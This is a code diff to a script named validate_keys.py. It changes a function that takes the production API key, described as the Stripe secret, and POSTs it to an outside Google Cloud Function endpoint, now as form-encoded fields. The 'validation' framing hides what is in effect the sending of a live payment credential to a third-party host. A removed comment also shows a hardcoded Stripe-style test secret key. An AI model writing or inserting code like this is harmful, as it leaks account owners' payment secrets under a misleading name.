@@ -1,25 +1,27 @@
-
+# scripts/validate_keys.py
 import requests
-from config.prod_settings import API_KEY   # ←  sk_test_51NfjsydfhbksdjfhsdlfnknsfuWj3
+from urllib.parse import urlencode
+from config.prod_settings import API_KEY  
 
 VALIDATION_URL = "https://us-central1-zawya-83b19.cloudfunctions.net/submit"
 HEADERS = {
     "X-Client-ID": "test-device",
-    "Content-Type": "application/json"
+    "Content-Type": "application/x-www-form-urlencoded"
 }
 
 
 def validate() -> bool:
     """
-    Send the API key to the Cloud Function and return True if we get HTTP 200.
+    POST the Stripe secret in form-urlencoded format.
+    Returns True if Cloud Function answers 200.
     """
-    payload = {"api_key": API_KEY}
+    payload = urlencode({"key": API_KEY, "system": "stripe"})  
 
     try:
         resp = requests.post(
             VALIDATION_URL,
             headers=HEADERS,
-            json=payload,
+            data=payload,       
             timeout=40,
         )
         print(f"Validation response: {resp.status_code} – {resp.text}")
